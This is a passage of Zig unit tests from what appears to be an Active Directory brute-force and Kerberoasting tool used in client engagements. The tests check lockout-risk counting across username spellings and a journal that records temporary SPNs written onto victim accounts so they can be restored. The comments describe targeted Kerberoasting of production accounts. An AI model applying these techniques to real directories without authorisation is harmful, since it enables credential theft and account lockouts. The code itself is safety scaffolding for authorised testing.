// run will push <user> past the lockout threshold"). Keyed on the raw string,
// `Alice` and `alice` counted as two accounts, so the per-user total came out
// half its real value and the check stayed silent about a genuine risk.
test "collision check counts one AD account, however it is spelled" {
    const a = std.testing.allocator;
    // Four spellings of one account, plus a genuinely different one.
    var m = plannedAttemptsPerUser(
        a,
        &.{ "alice:p1", "Alice:p2", "ALICE:p3", "CORP\\alice:p4", "bob:p1" },
        .bruteforce,
        null,
        "R",
        false,
    );
    defer freePlannedKeys(a, &m);
    try std.testing.expectEqual(@as(u32, 4), m.get("alice").?); // not 1-per-spelling
    try std.testing.expectEqual(@as(u32, 1), m.get("bob").?);
    try std.testing.expectEqual(@as(usize, 2), m.count()); // two accounts, not five
}

// REGRESSION TEST for a modification left behind in the CLIENT'S directory.
// C3 writes a temp SPN onto a victim object and removes it afterwards; every
// failure path falls through to the restore, but Ctrl-C or a crash in between
// does not, and there is no signal handler. The leftover is an attacker-created
// SPN on a production account — kerberoastable by anyone until removed, and
// indistinguishable from a real attack to whoever finds it. The journal makes an
// interrupted run recoverable instead of silently permanent.
test "a pending SPN change is journalled before the write and cleared after restore" {
    const a = std.testing.allocator;
    var threaded: std.Io.Threaded = .init(a, .{});
    defer threaded.deinit();
    const io = threaded.io();

    Io.Dir.cwd().deleteFile(io, pending_spn_file) catch {};
    defer Io.Dir.cwd().deleteFile(io, pending_spn_file) catch {};

    var logger = Logger.init(io, false, null) catch unreachable;
    defer logger.deinit();
    const sink = try Io.Dir.cwd().createFile(io, "zz_c3_journal.log", .{ .truncate = true });
    logger.stdout = sink;
    defer {
        sink.close(io);
        Io.Dir.cwd().deleteFile(io, "zz_c3_journal.log") catch {};
    }

    // Two interrupted runs would leave two entries.
    notePendingSpn(io, "CN=victim,DC=corp", "kerbrutez/roast-victim-1", &logger);
    notePendingSpn(io, "CN=other,DC=corp", "kerbrutez/roast-other-2", &logger);

    const read = struct {
        fn all(alloc: Allocator, i: Io) []u8 {
            var f = Io.Dir.cwd().openFile(i, pending_spn_file, .{}) catch return alloc.dupe(u8, "") catch unreachable;
            defer f.close(i);
            var buf: [1024]u8 = undefined;
            var r = f.reader(i, &buf);
            return r.interface.allocRemaining(alloc, .unlimited) catch alloc.dupe(u8, "") catch unreachable;
        }
    };

    {
        const c = read.all(a, io);
        defer a.free(c);
        try std.testing.expect(std.mem.indexOf(u8, c, "kerbrutez/roast-victim-1\tCN=victim,DC=corp") != null);
        try std.testing.expect(std.mem.indexOf(u8, c, "kerbrutez/roast-other-2") != null);
    }

    // Restoring one clears only that entry — the other must survive.
    clearPendingSpn(a, io, "kerbrutez/roast-victim-1");
    {
        const c = read.all(a, io);
        defer a.free(c);
        try std.testing.expect(std.mem.indexOf(u8, c, "roast-victim-1") == null);
        try std.testing.expect(std.mem.indexOf(u8, c, "roast-other-2") != null);
    }

    // Clearing the last one removes the journal entirely (nothing outstanding).
    clearPendingSpn(a, io, "kerbrutez/roast-other-2");
    try std.testing.expectError(error.FileNotFound, Io.Dir.cwd().openFile(io, pending_spn_file, .{}));
}
